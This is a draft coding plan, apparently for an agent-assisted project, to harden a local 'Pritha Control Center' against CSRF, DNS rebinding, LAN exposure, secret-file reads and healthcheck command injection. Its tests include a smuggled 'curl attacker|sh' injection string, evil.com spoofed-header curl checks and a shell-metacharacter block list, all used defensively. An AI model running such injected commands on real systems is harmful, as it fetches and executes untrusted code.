---
id: 2026-06-27-control-center-security-fix-coding-plan
type: workflow
status: draft
created: 2026-06-27
updated: 2026-06-27
topics:
  - pritha-control-center
  - security-hardening
  - csrf
  - dns-rebinding
  - tailscale
  - agents-mother
tools:
  - Next.js
  - TypeScript
  - Tailscale
  - Node.js
agent_platforms:
  - Codex
  - Pritha Control Center
runtime_environment:
  - local-project
  - mac
  - control-center
  - tailscale-private-access
config_surfaces:
  - interfaces/control-center/src/proxy.ts
  - interfaces/control-center/src/lib/security/api-guard.ts
  - interfaces/control-center/package.json
  - interfaces/control-center/src/lib/control-center/server.ts
  - interfaces/control-center/src/lib/access-mode.ts
  - interfaces/control-center/src/components/settings/SettingsControlPage.tsx
  - interfaces/control-center/src/lib/realtime/pritha-runtime.ts
  - scripts/bootstrap.mjs
  - scripts/tailscale-setup.mjs
  - scripts/agents-mother/scaffold/index.mjs
  - scripts/agents-mother/index.mjs
  - scripts/agents-mother/contract.mjs
  - .env.example
  - docs/tailscale-private-access.md
  - interfaces/control-center/README.md
  - docs/getting-started.md
  - docs/troubleshooting.md
sources:
  - operator-attached-security-fix-plan-2026-06-27
  - https://nextjs.org/docs/app/getting-started/proxy
  - https://tailscale.com/docs/features/tailscale-serve
  - https://tailscale.com/docs/reference/tailscale-cli/serve
  - interfaces/control-center/package.json
  - interfaces/control-center/src/lib/control-center/server.ts
  - interfaces/control-center/src/lib/realtime/pritha-runtime.ts
  - scripts/bootstrap.mjs
  - scripts/tailscale-setup.mjs
  - scripts/agents-mother/scaffold/index.mjs
related:
  standards:
    - 04_standards/tailscale-private-device-access-for-local-agents.md
    - 04_standards/agent-untrusted-input-security.md
    - 04_standards/agent-ai-safe-security-checklist.md
  workflows:
    - 07_workflows/first-run-setup.md
    - 07_workflows/agents-mother.md
supersedes: []
superseded_by: []
freshness_status: current
source_published: 2026-06-27
source_updated: 2026-06-27
source_version: security fix plan phase 1; Next.js 16.2.7 local package; Tailscale Serve docs checked 2026-06-27
retrieved: 2026-06-27
verified: 2026-06-27
valid_for: Pritha Control Center phase 1 localhost plus trusted Tailscale hardening
temporal_status: version-bound
memory_domain: pritha-self
memory_domains:
  - pritha-self
  - agent-building-knowledge
  - governance
subject:
  kind: workflow
  id: control-center-security-fix-phase-1
privacy: public
retention: durable
review_status: draft
confidence: high
---

# Coding Plan: Control Center Security Fix Phase 1

Date: 2026-06-27
Status: draft implementation plan
Branch: `codex/security-fix-plan-analysis`

## Goal

Implement the attached Security Fix Plan safely under the phase 1 threat model:
Control Center listens on loopback only, remote access goes through Tailscale
Serve from trusted devices/identities, and public/LAN exposure is blocked by
default.

The implementation must neutralize browser-side CSRF/DNS-rebinding, tailnet
identity drift, accidental LAN binding, `full_pritha_memory` secret reads, and
healthcheck command injection in generated deployment scripts without breaking
the existing Control Center voice/settings/agents UX.

## Baseline Findings

- The local package is `next@16.2.7`; current Next.js docs call the old
  Middleware file convention "Proxy". Prefer `src/proxy.ts` over a new
  `src/middleware.ts` while preserving the behavior from the attached plan.
- `interfaces/control-center/package.json` currently allows
  `PRITHA_CONTROL_CENTER_HOST` to override `dev` and `start`, so
  `0.0.0.0` is still possible.
- Settings and docs still present LAN as a supported temporary phone path.
  Phase 1 must change this UX to "LAN disabled by policy; use Tailscale".
- `readArtifact` in `pritha-runtime.ts` only checks root containment and does
  not reuse `FILESYSTEM_EXCLUDED_FILE_PATTERNS`, so `.env` can be read by path.
- Generated child-agent `deploy-service.mjs` still runs
  `manifest.healthcheck_command` through `/bin/sh -lc`. Existing manifests also
  keep legacy string fields, so the safe migration must preserve display/planning
  compatibility while making executable healthchecks argv-only.

## Implementation Principles

- Keep changes scoped. No sessions, cookies, mTLS, pairing, nonce-confirmation,
  or large runtime rewrites in this phase.
- Fail closed for unknown hosts, unknown Tailscale identity, and unsafe
  healthcheck command shape.
- Preserve same-origin loopback UI flows: `/voice`, `/settings`, `/agents`,
  Realtime session creation, Realtime tool calls, music controls, maintenance
  buttons, and agent operator actions.
- Do not run mutating Tailscale actions during implementation. Only update
  scripts/docs; real `serve --yes`, `off --yes`, `tailscale up`, Funnel,
  launchd, cron, or service changes still require separate user approval.
- Keep legacy command strings as planning evidence only. New executable paths
  must use argv arrays with `shell: false`.

## Phase 0 - Guardrails Before Editing

1. Confirm branch and worktree:
   - `git status --short --branch`
   - expected branch: `codex/security-fix-plan-analysis`
2. Run focused baseline checks before code edits:
   - `npm --prefix interfaces/control-center run typecheck`
   - `node --test --test-concurrency=1 tests/control-center-access-mode.test.mjs tests/control-center-health.test.mjs tests/agents-mother-command-modules.test.mjs`
3. Record any pre-existing failures before changing code.

## Phase 1 - API Guard Through Next Proxy

Target files:

- `interfaces/control-center/src/proxy.ts`
- `interfaces/control-center/src/lib/security/api-guard.ts`
- `interfaces/control-center/tests/api-guard.test.mjs`
- `.env.example`
- `scripts/tailscale-setup.mjs`
- `docs/tailscale-private-access.md`

Plan:

1. Add a pure guard helper in `src/lib/security/api-guard.ts`.
   - Export a function such as `evaluateApiRequestGuard(input)` returning
     `{ action: "allow" | "deny"; error?: string; requestHeaders?: Headers }`.
   - Keep this helper framework-light so tests can exercise all edge cases
     without constructing full Next internals.
   - Normalize hosts robustly. Do not use simple `split(":")[0]`; it breaks
     IPv6 host headers like `[::1]:3420`. Use `URL` parsing fallback and strip
     brackets/ports intentionally.
   - Loopback hosts: `localhost`, `127.0.0.1`, `::1`, `[::1]`.
   - Tailnet hosts: prefer explicit `PRITHA_TAILNET_HOSTNAME` and existing
     `PRITHA_CONTROL_CENTER_TAILSCALE_HOST`; keep `.ts.net` fallback only with
     identity-header requirement so current Tailscale discovery does not break.
   - Tailnet identity header: read `tailscale-user-login` case-insensitively.
     Compare against `PRITHA_TAILSCALE_ALLOWED_LOGINS` when configured.
   - Mutating methods: `POST`, `PUT`, `PATCH`, `DELETE`.
   - CSRF rules:
     - deny `Sec-Fetch-Site` values other than `same-origin` and `none`;
     - when `Origin` exists, require normalized origin host to match request
       host;
     - malformed `Origin` returns `bad_origin`.
   - Loopback requests must strip any incoming `tailscale-user-login` header.

2. Add `src/proxy.ts`.
   - Import `NextRequest` and `NextResponse`.
   - Run the pure helper only for `/api/*`.
   - Return JSON `403` with `{ ok: false, error }` on deny.
   - Return `NextResponse.next({ request: { headers } })` when loopback identity
     stripping changed headers.
   - Export `config = { matcher: ["/api/:path*"] }`.

3. Add tests.
   - `untrusted_host`: `Host: evil.com` on `/api/status` returns deny.
   - `origin_mismatch`: loopback host plus `Origin: https://evil.com` on `POST`.
   - `cross_site_blocked`: `Sec-Fetch-Site: cross-site` on `POST`.
   - `tailnet_without_identity`: `.ts.net` host without login returns deny.
   - `tailnet_allowed_identity`: configured login passes.
   - `tailnet_disallowed_identity`: configured allowlist denies unknown login.
   - `loopback_strip_identity`: loopback host with spoofed login allows but
     removes the identity header.
   - `same_origin_happy_path`: loopback `POST` with same-origin headers passes.
   - `ipv6_loopback`: `[::1]:3420` is accepted as loopback.

4. Update environment docs.
   - Add `.env.example` entries:
     - `PRITHA_TAILNET_HOSTNAME=`
     - `PRITHA_TAILSCALE_ALLOWED_LOGINS=`
   - Mention that missing Tailscale identity fails closed.
   - Update Tailscale docs and setup output to tell the operator to verify
     `Tailscale-User-Login`/identity forwarding before accepting phone access.

Compatibility checks:

- `/api/realtime/session`, `/api/realtime/session-config`, `/api/realtime/tool`,
  `/api/realtime/call`, music API, maintenance API, agent actions, and settings
  credential APIs must still work from the same-origin UI.
- Browser-created OpenAI Realtime connections should remain unaffected because
  OpenAI servers do not call the local `/api/*` endpoints directly.

## Phase 2 - Enforce Loopback Binding And Fix UX Drift

Target files:

- `interfaces/control-center/package.json`
- `interfaces/control-center/scripts/host-policy.mjs`
- `scripts/bootstrap.mjs`
- `interfaces/control-center/src/lib/control-center/server.ts`
- `interfaces/control-center/src/lib/access-mode.ts`
- `interfaces/control-center/src/components/settings/SettingsControlPage.tsx`
- `interfaces/control-center/README.md`
- `docs/getting-started.md`
- `docs/troubleshooting.md`
- `tests/control-center-access-mode.test.mjs`

Plan:

1. Add `interfaces/control-center/scripts/host-policy.mjs`.
   - Accept empty, `127.0.0.1`, `localhost`, `::1`, and `[::1]`.
   - Reject any other `PRITHA_CONTROL_CENTER_HOST` with:
     `PRITHA_CONTROL_CENTER_HOST=0.0.0.0 is disabled in this build (localhost + Tailscale only).`
   - Exit non-zero on reject.

2. Update Control Center scripts:
   - `dev`: `node scripts/host-policy.mjs && next dev --hostname 127.0.0.1 --port ${PRITHA_CONTROL_CENTER_PORT:-3420}`
   - `start`: `node scripts/host-policy.mjs && next start --hostname 127.0.0.1 --port ${PRITHA_CONTROL_CENTER_PORT:-3420}`
   - Leave `build` focused on build-preflight unless tests show the env guard is
     needed there too.

3. Add a matching guard in `scripts/bootstrap.mjs`.
   - Before executing a Control Center start step, fail if
     `PRITHA_CONTROL_CENTER_HOST` is non-loopback.
   - This produces a clear error even when users start via
     `node scripts/bootstrap.mjs start --profile local`.

4. Fix access state and UX.
   - In `server.ts`, phase 1 should report LAN as unavailable by policy rather
     than suggesting `PRITHA_CONTROL_CENTER_HOST=0.0.0.0`.
   - Keep `lanUrl` optional for diagnostics only, but set `lanReady: false`.
   - In `access-mode.ts`, never prefer LAN while `access.lan !== "ready"`.
     Existing behavior mostly does this; update tests to assert LAN stays
     unavailable.
   - In Settings, keep or remove the LAN card intentionally. Preferred safe UX:
     keep it visible but disabled with text "Disabled by policy" so existing
     layout remains stable and users understand why LAN disappeared.
   - Replace text that says "Use LAN after binding to 0.0.0.0" with
     "Use Tailscale Serve for phone access".

5. Update docs.
   - Remove instructions recommending `PRITHA_CONTROL_CENTER_HOST=0.0.0.0`.
   - Replace with loopback plus Tailscale Serve instructions.
   - Keep a note that public Funnel remains out of scope.

Acceptance checks:

- `PRITHA_CONTROL_CENTER_HOST=0.0.0.0 npm --prefix interfaces/control-center run dev`
  exits before starting Next.
- `npm --prefix interfaces/control-center run dev` binds `127.0.0.1`.
- `node scripts/bootstrap.mjs start --profile local` keeps loopback behavior.
- Settings no longer tells the user to enable LAN binding.
- Tailscale Serve path still proxies to `http://127.0.0.1:<port>`.

## Phase 3 - Block Secret Reads In full_pritha_memory

Target files:

- `interfaces/control-center/src/lib/realtime/pritha-runtime.ts`
- `interfaces/control-center/tests/realtime-artifact-policy.test.mjs`

Plan:

1. Reuse the existing file exclusion policy.
   - Add a helper such as `isExcludedSecretPath(fullPath: string)` using
     `FILESYSTEM_EXCLUDED_FILE_PATTERNS`.
   - Apply it in `readArtifact` immediately after root containment and before
     `existsSync`/`readFile`.
   - Return `{ ok: false, error: "path_excluded", path: relative }`.

2. Keep the change narrow.
   - Do not refactor `full_pritha_memory`.
   - Do not change `inspect_pritha_files` behavior except possibly sharing the
     helper.

3. Add regression tests.
   - At minimum source-level tests should assert `readArtifact` calls the
     exclusion helper and returns `path_excluded`.
   - Preferred if feasible without large refactor: import a small extracted
     policy helper and test `.env`, `.env.local`, `secret.txt`, `token.json`,
     `private.pem`, `db.sqlite`, and a normal Markdown artifact.

Acceptance checks:

- `full_pritha_memory` read of `.env`, `.env.local`, `token*`, `*secret*`,
  `*.pem`, `*.key`, `*.sqlite`, and logs returns `path_excluded`.
- Regular Markdown artifacts still read normally.

## Phase 4 - Make Generated Deploy Healthchecks argv-only

Target files:

- `scripts/agents-mother/scaffold/index.mjs`
- `scripts/agents-mother/index.mjs`
- `scripts/agents-mother/contract.mjs`
- `scripts/agents-mother/operations.mjs`
- `scripts/agents-mother/card-readiness.mjs`
- `08_templates/agent-project-contract.md`
- `08_templates/agent-operations-report.md`
- `tests/agents-mother-command-modules.test.mjs`
- new focused test for scaffold healthcheck policy

Plan:

1. Add a safe command-shape helper in the scaffold generator.
   - Convert simple strings like `node scripts/smoke-test.mjs` to
     `["node", "scripts/smoke-test.mjs"]`.
   - Reject strings containing shell metacharacters:
     `;`, `|`, `&`, `$`, backtick, `>`, `<`, `(`, `)`, `{`, `}`, newline.
   - Do not attempt full shell parsing. Multi-step checks should move into a
     dedicated script such as `scripts/smoke-test.mjs`.

2. Generate both fields during migration.
   - `healthcheck_command`: display/planning string only.
   - `healthcheck_argv`: executable array or omitted/null when unsafe.
   - Add manifest policy marker, for example
     `healthcheck_command_executable: false`.

3. Update generated `deploy-service.mjs`.
   - `runHealthcheck()` must require `manifest.healthcheck_argv`.
   - Run `argv[0]`, `argv.slice(1)` through existing `run(...)`; no shell.
   - If argv is missing, print a clear error and exit:
     `No healthcheck_argv (array) in operations/manifest.json`.
   - Print display command for operator visibility without executing it.

4. Update contract/scaffold prompts and reports.
   - Keep "Healthcheck command" in human contracts for readability.
   - Add "Healthcheck argv" or document that executable healthchecks must be
     single-command argv-compatible.
   - In reports/operations status, prefer argv when present and warn when only
     legacy string exists.

5. Add tests.
   - Safe command `node scripts/smoke-test.mjs` generates
     `healthcheck_argv`.
   - Unsafe command `node scripts/smoke-test.mjs; curl attacker|sh` does not
     generate executable argv and deploy install refuses it.
   - Generated `deploy-service.mjs` source no longer contains `/bin/sh` or
     `-lc` for healthcheck execution.

Compatibility notes:

- Existing sibling agents may still have string `healthcheck_command`; Control
  Center can continue displaying it as planning evidence.
- Actual deployment install should fail closed until those projects add safe
  `healthcheck_argv`.

## Phase 5 - Tailscale Identity Readiness

Target files:

- `scripts/tailscale-setup.mjs`
- `docs/tailscale-private-access.md`
- `04_standards/tailscale-private-device-access-for-local-agents.md`
- `.env.example`

Plan:

1. Do not mutate Tailscale state during coding.
2. Enhance `plan`/`status` output to include an identity-header readiness note:
   - required for Control Center API access via tailnet;
   - missing identity results in `403 untrusted_tailscale_identity`.
3. Document the required env allowlist:
   - `PRITHA_TAILNET_HOSTNAME`
   - `PRITHA_CONTROL_CENTER_TAILSCALE_HOST` as existing compatibility alias
   - `PRITHA_TAILSCALE_ALLOWED_LOGINS`
4. Keep peer-device browser verification as the final readiness check.

## Verification Matrix

Run focused tests first:

```sh
npm --prefix interfaces/control-center run typecheck
node --test --test-concurrency=1 tests/control-center-access-mode.test.mjs tests/control-center-health.test.mjs tests/agents-mother-command-modules.test.mjs
npm --prefix interfaces/control-center run test:realtime-flow
```

Run Control Center checks:

```sh
npm run control-center:build
npm run control-center:health
```

Run broader gates if focused checks pass:

```sh
node scripts/quality-gate.mjs
node scripts/self-test.mjs
```

Manual curl checks after starting Control Center on loopback:

```sh
curl -i -X POST \
  -H 'Origin: https://evil.com' \
  -H 'Content-Type: text/plain' \
  --data '{"name":"run_codex_task"}' \
  http://127.0.0.1:3420/api/realtime/tool

curl -i -X POST \
  -H 'Host: evil.com' \
  http://127.0.0.1:3420/api/maintenance/github-update

PRITHA_CONTROL_CENTER_HOST=0.0.0.0 npm --prefix interfaces/control-center run dev
```

Expected:

- first curl returns `403 origin_mismatch`;
- second curl returns `403 untrusted_host`;
- non-loopback start fails before opening a listener.

## Rollback Plan

- API guard rollback: remove `src/proxy.ts` and guard helper, then rerun
  `typecheck` and Control Center health. This restores prior exposure and is
  security-regressive, so use only if the UI is unusable.
- Binding rollback: revert package script and access UX changes only if local
  startup is blocked for loopback. Do not restore `0.0.0.0` instructions.
- Artifact policy rollback: revert only if normal Markdown reads fail; keep
  secret patterns blocked.
- Healthcheck rollback: do not return to `/bin/sh -lc`. If argv migration
  blocks deployment, add a dedicated safe smoke-test script in the child agent.

## Open Questions Before Implementation

- Should `.ts.net` fallback remain enabled, or should phase 1 require explicit
  `PRITHA_TAILNET_HOSTNAME` for every tailnet API request? Safer default is
  explicit host; less disruptive default is `.ts.net` plus identity header.
- Should the LAN option remain visible as disabled-by-policy, or be removed
  from Settings entirely? Safer UX is visible-disabled because it explains the
  policy change without layout churn.
- Should generated contracts expose "Healthcheck argv" as a first-class field
  now, or keep it internal to scaffold generation until the next contract
  template revision?

## Acceptance Summary

- All `/api/*` requests are host-gated, CSRF-gated for unsafe methods, and
  Tailscale identity-gated on tailnet hosts.
- Direct LAN binding is blocked in package scripts and bootstrap.
- Settings/docs no longer instruct users to bind to `0.0.0.0`.
- `full_pritha_memory` cannot read `.env` or other secret-like files.
- Generated deployment healthchecks execute only argv arrays without shell.
- Existing same-origin Control Center workflows continue to pass health/type
  checks.
